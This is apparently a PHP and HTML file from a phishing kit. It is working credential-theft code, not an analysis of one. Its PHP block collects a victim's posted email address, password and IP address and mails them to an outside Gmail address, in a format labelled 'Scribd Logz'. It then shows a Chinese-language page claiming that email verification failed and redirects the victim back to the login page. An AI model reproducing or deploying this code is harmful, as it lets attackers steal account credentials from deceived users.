<?php

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];


$data = "
------------ Scribd Logz ------------
E-mail ID : $email
Password  : $password
-------------------------
IP : $ip
------------ goodFella Inc 2017 ------------
";

$mailsubj = "| Login: | $email | $password ";


$emailusr = 'freshoutoflogz@gmail.com';

mail($emailusr, $mailsubj, $data);

?>
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>&#38651;&#23376;&#37109;&#20214;&#35373;&#23450; | &#24115;&#25142;&#26680;&#26597;</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="refresh" content="10;url=index.html" />

<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-15'/>
<!-- no core stylesheet -->
</head>


<form method='post' action=''>

                        <font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="3">
                        <div align="center">

			<br><br><br><br><br>

			<div>
			<h2>&#38651;&#23376;&#37109;&#20214;&#39511;&#35657;&#22833;&#25943;!</h2>
			<p>&#20877;&#35430;&#19968;&#27425;&#65281;&#20006;&#30906;&#20445;&#24744;
			&#36664;&#20837;&#27491;&#30906;&#30340;&#23494;&#30908;&#21040;&#27492;
			&#38651;&#23376;&#37109;&#20214;&#36889;&#27425;.</p>

			<p>&#20320;&#23559;&#24456;&#24555;&#23601;&#34987;&#37325;&#23450;&#21521;
			&#22238;&#12290;&#35531;&#31561;&#24453;&#19968;&#27573;&#26178;&#38291;!</p>

			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->